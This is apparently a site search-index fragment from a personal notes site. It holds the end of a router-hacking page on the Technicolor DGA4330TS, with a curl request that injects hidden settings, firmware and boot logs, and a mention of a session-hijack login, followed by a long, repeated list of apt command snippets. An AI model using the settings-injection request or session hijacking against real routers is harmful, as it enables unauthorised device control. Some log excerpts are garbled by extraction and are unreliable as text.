OR Edit: /etc/security/limits.conf, example see below: admin_user_ID soft nofile 32768 admin_user_ID hard nofile 65536 Whatever, this is not the right place to go deeper in this topic, if you are curios about this read manual, see examples with below command: LESS = +/EXAMPLES man limits.conf","title":"VBNT-7"},{"location":"hacking/routers/technicolor_dga4330ts/#the-bridge-card-and-eth-linespeed-card-is-new","text":"","title":"The Bridge Card and ETH Linespeed card is new"},{"location":"hacking/routers/technicolor_dga4330ts/#stuff-that-is-new-and-not-included-in-older-models-that-i-have-found-and-might-be-intresting-for-someone-i-hope","text":"[ error ] 6180 #0: *4 open() \"/www/api/reload\" failed (2: No such file or directory), client: 127.0.0.1, server: 127.0.0.1, request: \"GET /api/reload HTTP/1.1\", host: \"localhost:55555\"","title":"Stuff that is new and not included in older models that I have found and might be intresting for someone I hope:"},{"location":"hacking/routers/technicolor_dga4330ts/#curl","text":"It is possible to inject hidden settings, ntp server is set in /etc/config/system so it might be possible to change other values as well. curl 'http://192.168.1.100/modals/gateway-modal.lp' \\ -H 'Connection: keep-alive' \\ -H 'Accept: text/html, */*; q=0.01' \\ -H 'DNT: 1' \\ -H 'X-Requested-With: XMLHttpRequest' \\ -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36' \\ -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \\ -H 'Origin: http://192.168.1.100' \\ -H 'Referer: http://192.168.1.100/gateway.lp' \\ -H 'Accept-Language: en-US,en;q=0.9' \\ -H 'Cookie: sessionID=4514d437a748c46c63964259cda91055ce4887853e8d1689a24c215e75e88354' \\ --data-raw 'system_network_timezone=_DUMMY_&system_timezone=GMT0_timezone_Africa%2FAbidjan&action=SAVE&fromModal=YES&CSRFtoken=c7c237f206d264f03bcd562801111d161a1357f7a7dfdad53c62447763d8ed90' \\ --compressed \\ --insecure","title":"Curl"},{"location":"hacking/routers/technicolor_dga4330ts/#firmware","text":"When I use binwalk and extracting the firmware file it says the file is MySQL MISAM filetype, I am unsure if this is a binwalk bug or not, output: binwalk -Me 2021 /1830710-7-2981008.rbi Scan Time: 2021 -12-28 15 :00:28 Target File: TECHNICOLOR_DGA4330TS/firmware/2021/1830710-7-2981008.rbi MD5 Checksum: e12622f04704425ea2c7cf52c80ec6db Signatures: 411 DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 8904736 0x87E020 MySQL MISAM compressed data file Version 11 14608824 0xDEE9B8 MySQL ISAM index file Version 8","title":"Firmware"},{"location":"hacking/routers/technicolor_dga4330ts/#etcrcds90fhcd","text":"f hcd. f hcd.e na ble= 1 valida tes as bool wi t h true f hcd. f hcd. tls _cer t =/ t mp/cer ts /chai n .pem valida tes as f ile wi t h false f hcd. f hcd. tls _key=/ t mp/cer ts /key.pem valida tes as or( f ile , regex( \"engine\\:.*\" )) wi t h false f hcd. f hcd. tls _cas t ore=/ t mp/cer ts /ca valida tes as direc t ory wi t h false f hcd. f hcd.i nterfa ce [ 0 ] =la n valida tes as lis t (s tr i n g) wi t h true f hcd. f hcd.loglevel is u nset a n d de faults t o ra n ge( 0 , 7 ) ( null )","title":"/etc/rc.d/S90fhcd"},{"location":"hacking/routers/technicolor_dga4330ts/#core-lcm","text":"I masked the URL here since I dont know what its about atm: Dispa t chi n g s tart sig nal I n i t ial s tate s tart LCM comple te _upda te LCM comple te _upda te GET : h tt ps : //acs.file.abc.example.json/ipk/hw/ U na ble t o fet ch t he apps fr om t he backe n d : Backe n d error : Curl error : [ 6 ] Error Failed 'Dispa t chi n g s tart sig nal ' : Backe n d error : Curl error : [ 6 ] Error. 8 a tte mp ts le ft . Nex t a tte mp t i n 5 seco n ds. LCM cha n ged s tatus core - lcm , i nstalle d , 3.2.18 LCM cha n ged s tatus core - wa t chdog , i nstalle d , 2.1.4 APP_TRACE : bad address 'acs. tel ia.com' Eve nt lis ten i n g selec t re turne d error : I nterru p te d sys te m call I nstall i n g prebuil t ipks i nstea d : Do ne i nstall i n g prebuild ipks","title":"core-lcm"},{"location":"hacking/routers/technicolor_dga4330ts/#kernel-stuff","text":"sfpPhy_probe : Entering the functio , client -> addr = 0x50 i2c i2c -0 : new_device : Instantiated device sff8472_i2c at 0x50 sfpPhy_probe : Entering the functio , client -> addr = 0x51 i2c i2c -0 : new_device : Instantiated device sff8472_i2c at 0x51 jffs2 : notice : ( 4924 ) check_node_data : wrong data CRC in data node at 0x0488d978 : read 0x958e2b1e , calculated 0xf0ebf64b . parsing configuration nfq_init done nfq_thread entering main loop","title":"Kernel Stuff:"},{"location":"hacking/routers/technicolor_dga4330ts/#random-stuff","text":"Things I have personally no clue what it is really, adding below for myself to read more about. Notice the listen port\u2026 /etc/rc.d/S70iqos: iqctl: invalid command mosquitto version 1.5 starting mosquitto version 1.5 starting /etc/rc.d/S79sscert: sscert: The certificate was correctly generated The certificate was correctly generated /etc/rc.d/S80mosquitto: Generating mosquitto config file in /tmp/mosquitto.generated.conf Config loaded from /tmp/mosquitto.generated.conf. Notice : Check the listen port\u2026? Opening ipv4 listen socket on port 8883. Error: Unable to load server certificate \"/tmp/certs/chain.pem\". Check certfile. Opening ipv6 listen socket on port 8883. Error: Unable to load server certificate \"/tmp/certs/chain.pem\". Check certfile. Notice: \u2013 Check, this is from lxc on 192.168.1.153: client: 127.0.0.1, server: 127.0.0.1, request: \"GET /api/reload HTTP/1.1\", host: \"localhost:55555\" - * Notice* \u2013 TeliaLXC \u2013 It is on this hidden net the router trying to get the firmware on 131.116.22.230:80 OR acs.telia.com but the address is bad? So, we jump to? - Why the heck are they using curl when its not working? lol - Devbice isretrying every 60 seonds fpr 50 attempts until its halt. Notice, this was how I got all the logs and when I tried to login via session hijack it changed the user back to Administrator and curent_role=admin : 6180#0: *11 [lua] session.lua:103: changeUser(): changing user to Administrator, client: 192.168.1.10, server: localhost, request: \"POST /authenticate Unable to fetch the apps from the backend: Backend error: Curl error: [6] Error Failed 'Dispatching start signal': Backend error: Curl error: [6] Error. 8 attempts left. Next attempt in 5 seconds. DHCPACK(br-lan) 192.168.1.153 22:b0:01:e2:45:6f TeliaLXC Couldn't find systeminfo section: Device config error: Configurator error: Configurator error: No section named 'systeminfo'","title":"Random stuff"},{"location":"hacking/routers/technicolor_dga4330ts/#changelog","text":"Versions changelog .","title":"Changelog"},{"location":"hacking/routers/technicolor_dga4330ts/#authors","text":"wuseman < wuseman@nr1.nu >","title":"Authors:"},{"location":"hacking/routers/technicolor_dga4330ts/#license","text":"This project is licensed under the GNU General Public License v3.0 - see the LICENSE.md file for details","title":"License"},{"location":"hacking/routers/technicolor_dga4330ts/#contact","text":"If you have problems, questions, ideas or suggestions please contact me on * wuseman@nr1.nu - For faster contact visit Libera irc network or the webchat and type '/msg wuseman hi!' in the input bar and I will reply to you ASAP. Enter Libera's network via your own client 'chat.libera.chat:+6697 or use their new web client here .","title":"Contact"},{"location":"hacking/routers/technicolor_dga4330ts/#to-be-continued-stay-tuned","text":"","title":"To be continued, stay tuned!"},{"location":"linux/apt/","text":"apt Grep output from apt apt-cache -qq search apache2 | awk 'BEGIN{IGNORECASE=0} /php$|mysql|security2/ {print $0}' apt-cache search apache2 | grep -Ei \"(php|mysql|security2) \" apt-cache search apache2 | grep -o -Ei \"^[^[:space:]]+(php|mysql|security2)[[:space:]]\" apt-cache search apache2 | awk '/^[^[:space:]]+(php|mysql|security2)[[:space:]]/ {print $1}' apt-cache search apache2 | awk '/^[^[:space:]]+(php|mysql|security2)[[:space:]]/ {print $1}' Learn how to stop mistyping \"ls\" the fun way apt-get install sl ; sl Show a Package Version on Debian based distribution apt-show-versions <packagename> know which version of the program is installed on your Debian and derivatives aptitude show $PROGRAM | grep Vers Find packages on Ubuntu/Debian based on their description aptitude search ~d<string> Bulk install apt-cache search perl | grep module | awk '{print $1;}' | xargs sudo apt-get install -y Determine MythTV Version on a Debian System apt-cache policy mythtv Show the meta information on a package (dependency , statuts ..) on debian derivative distro apt-cache show Your_package Remove unused libs/packages in debian-based distros apt-get remove ` deborphan ` Lists installed kernels aptitude search \\~ ilinux-image Show the meta information on a package (dependency , statuts ..) on debian derivative distro aptitude show packages_name Refined repository search apt-get search something | grep specific Search for available software on a debian package system (Ubuntu) aptitude search NAME Have you mooed today? apt-get moo Search for APT Packages apt-cache search php5 Remove all unused kernels with ```sh apt-get ```sh aptitude remove $(dpkg -l|awk '/^ii linux-image-2/{print $2}'|sed 's/linux-image-//'|awk -v v=`uname -r` 'v>$0'|sed 's/-generic//'|awk '{printf(\"linux-headers-%s\\nlinux-headers-%s-generic\\nlinux-image-%s-generic\\n\",$0,$0,$0)}') Generate a graph of package dependencies apt-cache dotty apache2 | dot -T png | display search ubuntu packages to find which package contains the executable program programname apt-file find bin/programname ubuntu easter eggs apt-get moo ```sh aptitude easter eggs ```sh aptitude moo Colorful man apt-get install most && update-alternatives set pager /usr/bin/most Show Apt/Dpkg configuration apt-config dump Find the package a command belongs to on debian-based distros apt-file search iostat Search for packages, ranked by popularity apt-popcon () { ( echo \\# rank ; apt-cache search \" $@ \" | awk '$1 !~ /^lib/ {print \" \"$1\" \"}' ) | grep -Ff- < ( wget -qqO- http://popcon.debian.org/by_inst.gz | gunzip ) ; } How to know the total number of packages available apt-cache stats Bulk install aptitude install '?and(~nlib.*perl, ~Dmodule)' List available upgrades from apt without upgrading the system apt-get just-print upgrade Create package dependency graph apt-cache dotty PKG-NAME | dot -Tpng | display Show a Package Version on Debian based distribution apt-cache show pkgname | grep -i \"version:\" Enable programmable bash completion in debian lenny aptitude install bash-completion ; source /etc/bash_completion Purge configuration files of removed packages on debian based systems aptitude purge '~c' List manually installed packages (excluding Essentials) aptitude search '~i!~E' | grep -v \"i A\" | cut -d \" \" -f 4 Deploy git server repo apt-get -y install git-core gitosis ; adduser home /home/git gecos \"git user\" git ; su git -c \"ssh-keygen -t rsa -f /home/git/.ssh/id_rsa; gitosis-init < ~/.ssh/id_rsa\" Remove all unused kernels with aptitude aptitude remove ?and ( ~i~nlinux- ( im | he ) ?not ( ~n ` uname -r ` )) Cancel all ```sh aptitude scheduled actions ```sh aptitude keep-all Shows all packages installed that are recommended by other packages aptitude search '?and( ?automatic(?reverse-recommends(?installed)), ?not(?automatic(?reverse-depends(?installed))) )' Remove specific versions of old kernels (Ubuntu/Debian) apt purge linux* { 14 ..18 } * print the name of each package APT knows [matching a prefix] apt-cache pkgnames linux- Aptitude pattern match aptitude purge remove ~i^foo ~i^bar List upgrade-able packages on Ubuntu apt-get ignore-hold allow-unauthenticated -s dist-upgrade | grep ^Inst | cut -d ' ' -f2 \"Clone\" a list of installed packages from one Debian/Ubuntu Server to another apt-get install ` ssh root@host_you_want_to_clone \"dpkg -l | grep ii\" | awk '{print $2}' ` Purge configuration file of all desinstalled package aptitude purge ~c Purge configuration file of all desinstalled package aptitude purge ~c List available upgrades from apt without upgrading the system ```sh apt list upgradable Generate a list of installed packages on Debian-based systems aptitude search ~i -F %p AllInOne package maintainance apt-get update && apt-get dist-upgrade -y show-progress && apt-get autoremove -y && apt-get check && apt-get autoclean -y Removes all packages recommended by other packages aptitude remove '?and( ?automatic(?reverse-recommends(?installed)), ?not(?automatic(?reverse-depends(?installed))) )' Seach for packages on Debian using regex. aptitude search ^tin Remove unused libs/packages aptitude remove $( deborphan ) Install evertything with the prefix pidgin or wathever apt-cache search pidgin* | awk '{print$ 1}' | tr '\\n' ' ' | xargs aptitude -y install Install phpmyadmin in Debian 6 apt-get install phpmyadmin ; echo \"Include /etc/phpmyadmin/apache.conf\" >> /etc/apache2/apache2.conf ; service apache2 restart repository search aptitude search ~d \"irc client\" | grep -i \"irc client\" Show a Package Version on Debian based distribution aptitude -F '%p %v#' search <pattern> Quick and dirty list of installed packages on deb based system apt-cache -n dumpavail | grep 'Package:' | awk '{print $2 }' Atualizar Ubuntu apt-get update -y && apt-get upgrade -y && apt-get dist-upgrade -y && apt-get autoremove -y && apt-get autoclean -y Check the package is installed or not. There will show the package name which is installed. apt-show-versions | grep '\\bpython\\b' Show package dependencies with apt apt-cache depends <packagename> Show package reverse dependencies with apt apt-cache rdepends <packagename> Marks all manually installed deb packages as automatically installed. aptitude -F \"%p\" search \\! ~M~i~T | xargs apt-mark markauto Print sorted list of all installed packages (Debian) aptitude search -F \"%p\" disable-columns ~i Search packages beginning with the letter aptitude search ~n^s.* Purge all broken packages on ubuntu aptitude purge $( dpkg -l | grep ^rc | awk '{ print $2 }' ) Displays all available firmware you can get (non-free) in a Debian system apt-file package-only search /lib/firmware Displays all installed firmware in your Debian sytem aptitude search ~i ~nfirmware Remove all unused kernels with apt-get aptitude remove $( dpkg -l | awk '/^ii linux-image-2/{print $2}' | sed 's/linux-image-//' | awk -v v = ` uname -r ` 'v>$0' | sed 's/-generic//' | awk '{printf(\"linux-headers-%s\\nlinux-headers-%s-generic\\nlinux-image-%s-generic\\n\",$0,$0,$0)}' ) Generate a graph of package dependencies apt-cache dotty apache2 | dot -T png | display search ubuntu packages to find which package contains the executable program programname apt-file find bin/programname ubuntu easter eggs apt-get moo Colorful man apt-get install most && update-alternatives set pager /usr/bin/most Show Apt/Dpkg configuration apt-config dump Find the package a command belongs to on debian-based distros apt-file search iostat Search for packages, ranked by popularity apt-popcon () { ( echo \\# rank ; apt-cache search \" $@ \" | awk '$1 !~ /^lib/ {print \" \"$1\" \"}' ) | grep -Ff- < ( wget -qqO- http://popcon.debian.org/by_inst.gz | gunzip ) ; } How to know the total number of packages available apt-cache stats Bulk install aptitude install '?and(~nlib.*perl, ~Dmodule)' List available upgrades from apt without upgrading the system apt-get just-print upgrade Create package dependency graph apt-cache dotty PKG-NAME | dot -Tpng | display Show a Package Version on Debian based distribution apt-cache show pkgname | grep -i \"version:\" Enable programmable bash completion in debian lenny aptitude install bash-completion ; source /etc/bash_completion Purge configuration files of removed packages on debian based systems aptitude purge '~c' List total available upgrades from apt without upgrading the system apt-get -s upgrade | awk '/[0-9]+ upgraded,/ {print $1 \" package updates are available\"}' List manually installed packages (excluding Essentials) aptitude search '~i!~E' | grep -v \"i A\" | cut -d \" \" -f 4 Deploy git server repo apt-get -y install git-core gitosis ; adduser home /home/git gecos \"git user\" git ; su git -c \"ssh-keygen -t rsa -f /home/git/.ssh/id_rsa; gitosis-init < ~/.ssh/id_rsa\" Remove all unused kernels with apt ```sh aptitude remove ?and(~i~nlinux-(im|he) ?not(~n`uname -r`)) Cancel all ```sh aptitude scheduled actions ```sh aptitude keep-all Shows all packages installed that are recommended by other packages aptitude search '?and( ?automatic(?reverse-recommends(?installed)), ?not(?automatic(?reverse-depends(?installed))) )' Remove specific versions of old kernels (Ubuntu/Debian) apt purge linux* { 14 ..18 } * List available upgrades from ` ``sh apt (package names only) ### print the name of each package APT knows [matching a prefix] ```sh apt-cache pkgnames linux- Locating packages held back, such as with \"aptitude hold \" aptitude search ~ahold Aptitude pattern match aptitude purge remove ~i^foo ~i^bar List upgrade-able packages on Ubuntu apt-get ignore-hold allow-unauthenticated -s dist-upgrade | grep ^Inst | cut -d ' ' -f2 \"Clone\" a list of installed packages from one Debian/Ubuntu Server to another apt-get install ` ssh root@host_you_want_to_clone \"dpkg -l | grep ii\" | awk '{print $2}' ` Purge configuration file of all desinstalled package aptitude purge ~c Purge configuration file of all desinstalled package aptitude purge ~c List available upgrades from ```sh apt without upgrading the system ```sh apt list upgradable Generate a list of installed packages on Debian-based systems aptitude search ~i -F %p AllInOne package maintainance apt-get update && apt-get dist-upgrade -y show-progress && apt-get autoremove -y && apt-get check && apt-get autoclean -y search package descriptions (apt) apt-cache search someregex Removes all packages recommended by other packages aptitude remove '?and( ?automatic(?reverse-recommends(?installed)), ?not(?automatic(?reverse-depends(?installed))) )' Seach for packages on Debian using regex. aptitude search ^tin Remove unused libs/packages aptitude remove $( deborphan ) Install evertything with the prefix pidgin or wathever apt-cache search pidgin* | awk '{print$ 1}' | tr '\\n' ' ' | xargs aptitude -y install Install phpmyadmin in Debian 6 apt-get install phpmyadmin ; echo \"Include /etc/phpmyadmin/apache.conf\" >> /etc/apache2/apache2.conf ; service apache2 restart repository search aptitude search ~d \"irc client\" | grep -i \"irc client\" Show a Package Version on Debian based distribution aptitude -F '%p %v#' search <pattern> Quick and dirty list of installed packages on deb based system apt-cache -n dumpavail | grep 'Package:' | awk '{print $2 }' Atualizar Ubuntu apt-get update -y && apt-get upgrade -y && apt-get dist-upgrade -y && apt-get autoremove -y && apt-get autoclean -y Check the package is installed or not. There will show the package name which is installed. apt-show-versions | grep '\\bpython\\b' Marks all manually installed deb packages as automatically installed. aptitude -F \"%p\" search \\! ~M~i~T | xargs apt-mark markauto Print sorted list of all installed packages (Debian) aptitude search -F \"%p\" disable-columns ~i","title":"apt"},{"location":"linux/apt/#apt","text":"","title":"apt"},{"location":"linux/apt/#grep-output-from-apt","text":"apt-cache -qq search apache2 | awk 'BEGIN{IGNORECASE=0} /php$|mysql|security2/ {print $0}' apt-cache search apache2 | grep -Ei \"(php|mysql|security2) \" apt-cache search apache2 | grep -o -Ei \"^[^[:space:]]+(php|mysql|security2)[[:space:]]\" apt-cache search apache2 | awk '/^[^[:space:]]+(php|mysql|security2)[[:space:]]/ {print $1}' apt-cache search apache2 | awk '/^[^[:space:]]+(php|mysql|security2)[[:space:]]/ {print $1}'","title":"Grep output from apt"},{"location":"linux/apt/#learn-how-to-stop-mistyping-ls-the-fun-way","text":"apt-get install sl ; sl","title":"Learn how to stop mistyping \"ls\" the fun way"},{"location":"linux/apt/#show-a-package-version-on-debian-based-distribution","text":"apt-show-versions <packagename>","title":"Show a Package Version on Debian based distribution"},{"location":"linux/apt/#know-which-version-of-the-program-is-installed-on-your-debian-and-derivatives","text":"aptitude show $PROGRAM | grep Vers","title":"know which version of the program is installed on your Debian and derivatives"},{"location":"linux/apt/#find-packages-on-ubuntudebian-based-on-their-description","text":"aptitude search ~d<string>","title":"Find packages on Ubuntu/Debian based on their description"},{"location":"linux/apt/#bulk-install","text":"apt-cache search perl | grep module | awk '{print $1;}' | xargs sudo apt-get install -y","title":"Bulk install"},{"location":"linux/apt/#determine-mythtv-version-on-a-debian-system","text":"apt-cache policy mythtv","title":"Determine MythTV Version on a Debian System"},{"location":"linux/apt/#show-the-meta-information-on-a-package-dependency--statuts--on-debian-derivative-distro","text":"apt-cache show Your_package","title":"Show the meta information on a package (dependency , statuts ..) on debian derivative distro"},{"location":"linux/apt/#remove-unused-libspackages-in-debian-based-distros","text":"apt-get remove ` deborphan `","title":"Remove unused libs/packages in debian-based distros"},{"location":"linux/apt/#lists-installed-kernels","text":"aptitude search \\~ ilinux-image","title":"Lists installed kernels"},{"location":"linux/apt/#show-the-meta-information-on-a-package-dependency--statuts--on-debian-derivative-distro_1","text":"aptitude show packages_name","title":"Show the meta information on a package (dependency , statuts ..) on debian derivative distro"},{"location":"linux/apt/#refined-repository-search","text":"apt-get search something | grep specific","title":"Refined repository search"},{"location":"linux/apt/#search-for-available-software-on-a-debian-package-system-ubuntu","text":"aptitude search NAME","title":"Search for available software on a debian package system (Ubuntu)"},{"location":"linux/apt/#have-you-mooed-today","text":"apt-get moo","title":"Have you mooed today?"},{"location":"linux/apt/#search-for-apt-packages","text":"apt-cache search php5","title":"Search for APT Packages"},{"location":"linux/apt/#remove-all-unused-kernels-with-sh","text":"apt-get ```sh aptitude remove $(dpkg -l|awk '/^ii linux-image-2/{print $2}'|sed 's/linux-image-//'|awk -v v=`uname -r` 'v>$0'|sed 's/-generic//'|awk '{printf(\"linux-headers-%s\\nlinux-headers-%s-generic\\nlinux-image-%s-generic\\n\",$0,$0,$0)}')","title":"Remove all unused kernels with ```sh"},{"location":"linux/apt/#generate-a-graph-of-package-dependencies","text":"apt-cache dotty apache2 | dot -T png | display","title":"Generate a graph of package dependencies"},{"location":"linux/apt/#search-ubuntu-packages-to-find-which-package-contains-the-executable-program-programname","text":"apt-file find bin/programname","title":"search ubuntu packages to find which package contains the executable program programname"},{"location":"linux/apt/#ubuntu-easter-eggs","text":"apt-get moo","title":"ubuntu easter eggs"},{"location":"linux/apt/#sh","text":"aptitude easter eggs ```sh aptitude moo","title":"```sh"},{"location":"linux/apt/#colorful-man","text":"apt-get install most && update-alternatives set pager /usr/bin/most","title":"Colorful man"},{"location":"linux/apt/#show-aptdpkg-configuration","text":"apt-config dump","title":"Show Apt/Dpkg configuration"},{"location":"linux/apt/#find-the-package-a-command-belongs-to-on-debian-based-distros","text":"apt-file search iostat","title":"Find the package a command belongs to on debian-based distros"},{"location":"linux/apt/#search-for-packages-ranked-by-popularity","text":"apt-popcon () { ( echo \\# rank ; apt-cache search \" $@ \" | awk '$1 !~ /^lib/ {print \" \"$1\" \"}' ) | grep -Ff- < ( wget -qqO- http://popcon.debian.org/by_inst.gz | gunzip ) ; }","title":"Search for packages, ranked by popularity"},{"location":"linux/apt/#how-to-know-the-total-number-of-packages-available","text":"apt-cache stats","title":"How to know the total number of packages available"},{"location":"linux/apt/#bulk-install_1","text":"aptitude install '?and(~nlib.*perl, ~Dmodule)'","title":"Bulk install"},{"location":"linux/apt/#list-available-upgrades-from-apt-without-upgrading-the-system","text":"apt-get just-print upgrade","title":"List available upgrades from apt without upgrading the system"},{"location":"linux/apt/#create-package-dependency-graph","text":"apt-cache dotty PKG-NAME | dot -Tpng | display","title":"Create package dependency graph"},{"location":"linux/apt/#show-a-package-version-on-debian-based-distribution_1","text":"apt-cache show pkgname | grep -i \"version:\"","title":"Show a Package Version on Debian based distribution"},{"location":"linux/apt/#enable-programmable-bash-completion-in-debian-lenny","text":"aptitude install bash-completion ; source /etc/bash_completion","title":"Enable programmable bash completion in debian lenny"},{"location":"linux/apt/#purge-configuration-files-of-removed-packages-on--debian-based-systems","text":"aptitude purge '~c'","title":"Purge configuration files of removed packages on  debian based systems"},{"location":"linux/apt/#list-manually-installed-packages-excluding-essentials","text":"aptitude search '~i!~E' | grep -v \"i A\" | cut -d \" \" -f 4","title":"List manually installed packages (excluding Essentials)"},{"location":"linux/apt/#deploy-git-server-repo","text":"apt-get -y install git-core gitosis ; adduser home /home/git gecos \"git user\" git ; su git -c \"ssh-keygen -t rsa -f /home/git/.ssh/id_rsa; gitosis-init < ~/.ssh/id_rsa\"","title":"Deploy git server repo"},{"location":"linux/apt/#remove-all-unused-kernels-with-aptitude","text":"aptitude remove ?and ( ~i~nlinux- ( im | he ) ?not ( ~n ` uname -r ` ))","title":"Remove all unused kernels with aptitude"},{"location":"linux/apt/#cancel-all-sh","text":"aptitude scheduled actions ```sh aptitude keep-all","title":"Cancel all ```sh"},{"location":"linux/apt/#shows-all-packages-installed-that-are-recommended-by-other-packages","text":"aptitude search '?and( ?automatic(?reverse-recommends(?installed)), ?not(?automatic(?reverse-depends(?installed))) )'","title":"Shows all packages installed that are recommended by other packages"},{"location":"linux/apt/#remove-specific-versions-of-old-kernels-ubuntudebian","text":"apt purge linux* { 14 ..18 } *","title":"Remove specific versions of old kernels (Ubuntu/Debian)"},{"location":"linux/apt/#print-the-name-of-each-package-apt-knows-matching-a-prefix","text":"apt-cache pkgnames linux-","title":"print the name of each package APT knows [matching a prefix]"},{"location":"linux/apt/#aptitude-pattern-match","text":"aptitude purge remove ~i^foo ~i^bar","title":"Aptitude pattern match"},{"location":"linux/apt/#list-upgrade-able-packages-on-ubuntu","text":"apt-get ignore-hold allow-unauthenticated -s dist-upgrade | grep ^Inst | cut -d ' ' -f2","title":"List upgrade-able packages on Ubuntu"},{"location":"linux/apt/#clone-a-list-of-installed-packages-from-one-debianubuntu-server-to-another","text":"apt-get install ` ssh root@host_you_want_to_clone \"dpkg -l | grep ii\" | awk '{print $2}' `","title":"\"Clone\" a list of installed packages from one Debian/Ubuntu Server to another"},{"location":"linux/apt/#purge-configuration-file-of-all-desinstalled-package","text":"aptitude purge ~c","title":"Purge configuration file of all desinstalled package"},{"location":"linux/apt/#purge-configuration-file-of-all-desinstalled-package_1","text":"aptitude purge ~c","title":"Purge configuration file of all desinstalled package"},{"location":"linux/apt/#list-available-upgrades-from-apt-without-upgrading-the-system_1","text":"```sh apt list upgradable","title":"List available upgrades from apt without upgrading the system"},{"location":"linux/apt/#generate-a-list-of-installed-packages-on-debian-based-systems","text":"aptitude search ~i -F %p","title":"Generate a list of installed packages on Debian-based systems"},{"location":"linux/apt/#allinone-package-maintainance","text":"apt-get update && apt-get dist-upgrade -y show-progress && apt-get autoremove -y && apt-get check && apt-get autoclean -y","title":"AllInOne package maintainance"},{"location":"linux/apt/#removes-all-packages-recommended-by-other-packages","text":"aptitude remove '?and( ?automatic(?reverse-recommends(?installed)), ?not(?automatic(?reverse-depends(?installed))) )'","title":"Removes all packages recommended by other packages"},{"location":"linux/apt/#seach-for-packages-on-debian-using-regex","text":"aptitude search ^tin","title":"Seach for packages on Debian using regex."},{"location":"linux/apt/#remove-unused-libspackages","text":"aptitude remove $( deborphan )","title":"Remove unused libs/packages"},{"location":"linux/apt/#install-evertything-with-the-prefix-pidgin-or-wathever","text":"apt-cache search pidgin* | awk '{print$ 1}' | tr '\\n' ' ' | xargs aptitude -y install","title":"Install evertything with the prefix pidgin or wathever"},{"location":"linux/apt/#install-phpmyadmin-in-debian-6","text":"apt-get install phpmyadmin ; echo \"Include /etc/phpmyadmin/apache.conf\" >> /etc/apache2/apache2.conf ; service apache2 restart","title":"Install phpmyadmin in Debian 6"},{"location":"linux/apt/#repository-search","text":"aptitude search ~d \"irc client\" | grep -i \"irc client\"","title":"repository search"},{"location":"linux/apt/#show-a-package-version-on-debian-based-distribution_2","text":"aptitude -F '%p %v#' search <pattern>","title":"Show a Package Version on Debian based distribution"},{"location":"linux/apt/#quick-and-dirty-list-of-installed-packages-on-deb-based-system","text":"apt-cache -n dumpavail | grep 'Package:' | awk '{print $2 }'","title":"Quick and dirty list of installed packages on deb based system"},{"location":"linux/apt/#atualizar-ubuntu","text":"apt-get update -y && apt-get upgrade -y && apt-get dist-upgrade -y && apt-get autoremove -y && apt-get autoclean -y","title":"Atualizar Ubuntu"},{"location":"linux/apt/#check-the-package-is-installed-or-not-there-will-show-the-package-name-which-is-installed","text":"apt-show-versions | grep '\\bpython\\b'","title":"Check the package is installed or not. There will show the package name which is installed."},{"location":"linux/apt/#show-package-dependencies-with-apt","text":"apt-cache depends <packagename>","title":"Show package dependencies with apt"},{"location":"linux/apt/#show-package-reverse-dependencies-with-apt","text":"apt-cache rdepends <packagename>","title":"Show package reverse dependencies with apt"},{"location":"linux/apt/#marks-all-manually-installed-deb-packages-as-automatically-installed","text":"aptitude -F \"%p\" search \\! ~M~i~T | xargs apt-mark markauto","title":"Marks all manually installed deb packages as automatically installed."},{"location":"linux/apt/#print-sorted-list-of-all-installed-packages-debian","text":"aptitude search -F \"%p\" disable-columns ~i","title":"Print sorted list of all installed packages (Debian)"},{"location":"linux/apt/#search-packages-beginning-with-the-letter","text":"aptitude search ~n^s.*","title":"Search packages beginning with the letter"},{"location":"linux/apt/#purge-all-broken-packages-on-ubuntu","text":"aptitude purge $( dpkg -l | grep ^rc | awk '{ print $2 }' )","title":"Purge all broken packages on ubuntu"},{"location":"linux/apt/#displays-all-available-firmware-you-can-get-non-free-in-a-debian-system","text":"apt-file package-only search /lib/firmware","title":"Displays all available firmware you can get (non-free) in a Debian system"},{"location":"linux/apt/#displays-all-installed-firmware-in-your-debian-sytem","text":"aptitude search ~i ~nfirmware","title":"Displays all installed firmware in your Debian sytem"},{"location":"linux/apt/#remove-all-unused-kernels-with-apt-get","text":"aptitude remove $( dpkg -l | awk '/^ii linux-image-2/{print $2}' | sed 's/linux-image-//' | awk -v v = ` uname -r ` 'v>$0' | sed 's/-generic//' | awk '{printf(\"linux-headers-%s\\nlinux-headers-%s-generic\\nlinux-image-%s-generic\\n\",$0,$0,$0)}' )","title":"Remove all unused kernels with apt-get"},{"location":"linux/apt/#generate-a-graph-of-package-dependencies_1","text":"apt-cache dotty apache2 | dot -T png | display","title":"Generate a graph of package dependencies"},{"location":"linux/apt/#search-ubuntu-packages-to-find-which-package-contains-the-executable-program-programname_1","text":"apt-file find bin/programname","title":"search ubuntu packages to find which package contains the executable program programname"},{"location":"linux/apt/#ubuntu-easter-eggs_1","text":"apt-get moo","title":"ubuntu easter eggs"},{"location":"linux/apt/#colorful-man_1","text":"apt-get install most && update-alternatives set pager /usr/bin/most","title":"Colorful man"},{"location":"linux/apt/#show-aptdpkg-configuration_1","text":"apt-config dump","title":"Show Apt/Dpkg configuration"},{"location":"linux/apt/#find-the-package-a-command-belongs-to-on-debian-based-distros_1","text":"apt-file search iostat","title":"Find the package a command belongs to on debian-based distros"},{"location":"linux/apt/#search-for-packages-ranked-by-popularity_1","text":"apt-popcon () { ( echo \\# rank ; apt-cache search \" $@ \" | awk '$1 !~ /^lib/ {print \" \"$1\" \"}' ) | grep -Ff- < ( wget -qqO- http://popcon.debian.org/by_inst.gz | gunzip ) ; }","title":"Search for packages, ranked by popularity"},{"location":"linux/apt/#how-to-know-the-total-number-of-packages-available_1","text":"apt-cache stats","title":"How to know the total number of packages available"},{"location":"linux/apt/#bulk-install_2","text":"aptitude install '?and(~nlib.*perl, ~Dmodule)'","title":"Bulk install"},{"location":"linux/apt/#list-available-upgrades-from-apt-without-upgrading-the-system_2","text":"apt-get just-print upgrade","title":"List available upgrades from apt without upgrading the system"},{"location":"linux/apt/#create-package-dependency-graph_1","text":"apt-cache dotty PKG-NAME | dot -Tpng | display","title":"Create package dependency graph"},{"location":"linux/apt/#show-a-package-version-on-debian-based-distribution_3","text":"apt-cache show pkgname | grep -i \"version:\"","title":"Show a Package Version on Debian based distribution"},{"location":"linux/apt/#enable-programmable-bash-completion-in-debian-lenny_1","text":"aptitude install bash-completion ; source 